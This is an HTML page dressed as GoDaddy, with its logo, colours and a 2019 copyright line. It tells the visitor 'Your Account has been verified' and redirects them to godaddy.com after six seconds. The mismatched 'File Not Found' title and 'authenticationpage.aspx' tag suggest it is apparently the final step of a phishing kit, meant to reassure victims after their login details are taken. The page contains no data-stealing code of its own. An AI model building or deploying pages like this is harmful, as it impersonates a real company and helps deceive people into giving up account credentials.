<!DOCTYPE html>

<html lang="en">
<head>
<meta http-equiv="refresh" content="6;url=https://godaddy.com" />
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="e4ePage" content="authenticationpage.aspx"/>
    <script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-1.12.4.min.js"></script>
    <title>File Not Found</title>
    <link rel="shortcut icon" href="assets/favicon.ico" type="image/x-icon" />
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">

	<style>
		.custom-container {
		    vertical-align: middle;
		    horizontal-align: middle;
		    margin-top:15%;
		}
		
		.custom-row {
			margin-top:25px;
			text-align: center
		}
		
		.footer
		{
			font-size:13px
		}
		
		.otp
		{
			font-size:16px
		}
		
		.help-row
		{
			margin-top:45px
		}
		.help
		{
			font-size:18px
		}
		.account
		{
		    margin-left:3%;
		    margin-right:3%;
		}
        .header
		{
			background-color:#00a63f;
		}
		.vcenter {
		    vertical-align: middle;
		}
        .signin {
            cursor:pointer;
            cursor:hand;
        }
		.header-image
		{
			margin-top: -13px;
			max-width: 100%; 
			max-height: 80px;
			margin-bottom: -13px;
		}
		.header-text
		{
			margin-top: 4px;
		    font-size:15px;
		    color:#FFFFFF;
		    margin-left:4px;
		    margin-right:0px;
			margin-bottom: 4px;
		}
		.signin-text {
            font-size:18px;
            color:#00a63f;
        }
		.signin-texts {
            font-size:13px;
            color:#00a63f;
        }
		.foot {
    text-align: center;
    color: #2b2b2b;
}
	</style>  
</head>
<body dir="ltr">
    <div class="fluid-container">
		<div class="col-xs-12 header">
			<div class="col-xs-6"><img class="header-image pull-left" alt="Godaddy" src="images/logo.png" /></div>
		</div>
	</div>
    <div class="container">
	  <div class="row custom-container">
		    <div class="row custom-row"><p class="lead account">Thank You!</p></div>
	  </div>
      
      
	  <div class="row custom-row">
			<p class="lead account"></p>
	  </div>
	  <div id="signinButton" class="row custom-row signin">
		<font class="signin-text">Your Account has been verified</font>
	  </div>
      
	  <div class="row help-row">
		  <p class="help text-center"><a target="_blank" href="#"></a></p>
	  </div>
	  	  <div class="row help-row">
		  <p class="help text-center"><a target="_blank" href="#"></a></p>
	  </div>
	  	  <div class="row help-row">
		  <p class="help text-center"><a target="_blank" href="#"></a></p>
	  </div>
	  <div class="row custom-row">
			<br><br><p class="text-right foot"><font class="foot">Copyright © 1999 - 2019 GoDaddy Operating Company, LLC. All Rights Reserved. </font></p>
	  </div>
	  
	</div>
</body>
</html>